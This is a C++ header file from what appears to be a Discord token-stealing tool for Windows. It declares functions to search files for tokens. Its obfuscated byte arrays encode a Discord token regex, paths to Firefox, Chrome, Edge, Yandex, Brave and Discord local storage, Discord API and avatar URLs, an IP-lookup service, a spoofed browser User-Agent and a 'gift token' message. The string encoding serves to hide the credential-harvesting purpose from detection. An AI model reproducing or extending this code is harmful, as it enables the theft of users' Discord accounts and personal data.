#pragma once
#include <regex>
#include <iostream>
#include <fstream>
#include <string>
#include <array>
#include <Windows.h>

namespace regex
{
	//[A-z0-9-]{24}\.[A-z0-9-]{6}\.[A-z0-9-]{27}|mfa\.[A-z0-9-]{84}
	constexpr std::array<unsigned char, 61> regex_exp{94, 62, 48, 119, 51, 42, 60, 42, 96, 120, 53, 49, 128, 89, 49, 88, 68, 42, 125, 45, 48, 54,
													  48, 90, 126, 51, 128, 89, 49, 88, 68, 42, 125, 45, 48, 54, 48, 90, 126, 47, 58, 122, 127, 106,
													  105, 94, 95, 43, 94, 62, 48, 119, 51, 42, 60, 42, 96, 120, 59, 49, 128};

	std::vector<std::string> resplit(const std::string &s, const std::string &reg_str);
	std::vector<std::string> find_token(const std ::string &path);
}

namespace path
{

	std::string read_file(std::string path);
	std::string pog_mozilla(std::string path);
	std::string getusername();
	std::vector<std::string> get_paths();
	std::vector<std::string> extract_tokens(std ::vector<std ::string> file_paths);
}

namespace woow
{
	// C:\\Users\\ 
	constexpr std::array<unsigned char, 9> users { 70, 55, 95, 82, 118, 98, 117, 112, 95};
	// \\AppData
	constexpr std::array<unsigned char, 8> enc_app{95, 62, 115, 109, 71, 94, 119, 94};

	// \\Roaming\\Mozilla\\Firefox
	constexpr std::array<unsigned char, 24> moz_rolling{95, 79, 114, 94, 112, 102, 113, 100, 95, 74,
														114, 119, 108, 105, 111, 94, 95, 67, 108, 111,
														104, 99, 114, 117};
	// \\profiles.ini
	constexpr std::array<unsigned char, 13> pro_ini{95, 109, 117, 108, 105, 102, 111, 98, 118, 43, 108, 107, 108};

	// webappsstore.sqlite
	constexpr std::array<unsigned char, 19> webappstore{122, 98, 101, 94, 115, 109, 118, 112, 119, 108,
														117, 98, 49, 112, 116, 105, 108, 113, 104};

	// User Data\\Default\\Local Storage\\leveldb
	constexpr std::array<unsigned char, 39> enc_db_path{88, 112, 104, 111, 35, 65, 100, 113, 100, 89,
														71, 98, 105, 94, 120, 105, 119, 89, 79, 108, 102,
														94, 111, 29, 86, 113, 114, 111, 100, 100, 104, 89,
														111, 98, 121, 98, 111, 97, 101};

	// \\Local\\Google\\Chrome\\ /
	constexpr std::array<unsigned char, 21> chrome{95, 73, 114, 96, 100, 105, 95, 68, 114, 108, 106,
												   105, 104, 89, 70, 101, 117, 108, 112, 98, 95};
	// \\Local\\Microsoft\\Edge\\ /
	constexpr std::array<unsigned char, 22> edge{95, 73, 114, 96, 100, 105, 95, 74, 108, 96, 117, 108,
												 118, 108, 105, 113, 95, 66, 103, 100, 104, 89};
	// \\Local\\Yandex\\YandexBrowser\\ /
	constexpr std::array<unsigned char, 28> yandex{95, 73, 114, 96, 100, 105, 95, 86, 100, 107,
												   103, 98, 123, 89, 92, 94, 113, 97, 104, 117,
												   69, 111, 114, 116, 118, 98, 117, 89};
	// \\Local\\BraveSoftware\\Brave-Browser\\ /
	constexpr std::array<unsigned char, 35> brave{95, 73, 114, 96, 100, 105, 95, 63, 117, 94, 121, 98,
												  86, 108, 105, 113, 122, 94, 117, 98, 95, 63, 117, 94,
												  121, 98, 48, 63, 117, 108, 122, 112, 104, 111, 95};

	// \\Roaming\\discord\\Local Storage\\leveldb /
	constexpr std::array<unsigned char, 38> discord{95, 79, 114, 94, 112, 102, 113, 100, 95, 97,
													108, 112, 102, 108, 117, 97, 95, 73, 114, 96,
													100, 105, 35, 80, 119, 108, 117, 94, 106, 98,
													95, 105, 104, 115, 104, 105, 103, 95};

	// https://cdn.discordapp.com/avatars/
	constexpr std::array<unsigned char, 35> avatar_base_url{107, 113, 119, 109, 118, 55, 50, 44, 102, 97,
															113, 43, 103, 102, 118, 96, 114, 111, 103, 94,
															115, 109, 49, 96, 114, 106, 50, 94, 121, 94, 119,
															94, 117, 112, 50};

	// .png?size=128
	constexpr std::array<unsigned char, 13> png{49, 109, 113, 100, 66, 112, 108, 119, 104, 58, 52, 47, 59};

	// Got a gift token for us
	constexpr std::array<unsigned char, 23> gift{74, 108, 119, 29, 100, 29, 106, 102, 105, 113, 35, 113,
												 114, 104, 104, 107, 35, 99, 114, 111, 35, 114, 118};

	// https://ipinfo.io/
	constexpr std::array<unsigned char, 18> ip_url{107, 113, 119, 109, 118, 55, 50, 44, 108, 109,
												   108, 107, 105, 108, 49, 102, 114, 44};

	// Content-Type
	constexpr std::array<unsigned char, 12> content_type{70, 108, 113, 113, 104, 107, 119, 42, 87, 118, 115, 98};
	// application/json
	constexpr std::array<unsigned char, 16> type_value{100, 109, 115, 105, 108, 96, 100, 113, 108, 108, 113, 44, 109, 112, 114, 107};

	// https://discord.com/api/v9/users/@me
	constexpr std::array<unsigned char, 36> url{107, 113, 119, 109, 118, 55, 50, 44, 103, 102, 118,
												96, 114, 111, 103, 43, 102, 108, 112, 44, 100, 109,
												108, 44, 121, 54, 50, 114, 118, 98, 117, 112, 50, 61,
												112, 98};
	// Authorization
	constexpr std::array<unsigned char, 13> authorization{68, 114, 119, 101, 114, 111, 108, 119, 100, 113, 108, 108, 113};

	// User-Agent
	constexpr std::array<unsigned char, 12> user_agent{88, 112, 104, 111, 48, 62, 106, 98, 113, 113};

	// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15
	constexpr std::array<unsigned char, 119> agent_value{80, 108, 125, 102, 111, 105, 100, 44, 56, 43, 51, 29, 43, 74, 100, 96, 108, 107, 119,
														 108, 118, 101, 62, 29, 76, 107, 119, 98, 111, 29, 80, 94, 102, 29, 82, 80, 35, 85, 35,
														 46, 51, 92, 52, 46, 98, 51, 44, 29, 68, 109, 115, 105, 104, 84, 104, 95, 78, 102, 119,
														 44, 57, 45, 56, 43, 52, 43, 52, 50, 35, 37, 78, 69, 87, 74, 79, 41, 35, 105, 108, 104,
														 104, 29, 74, 98, 102, 104, 114, 38, 35, 83, 104, 111, 118, 102, 114, 107, 50, 46, 52, 43,
														 52, 43, 53, 29, 86, 94, 105, 94, 117, 102, 50, 51, 51, 50, 49, 46, 49, 46, 56};
}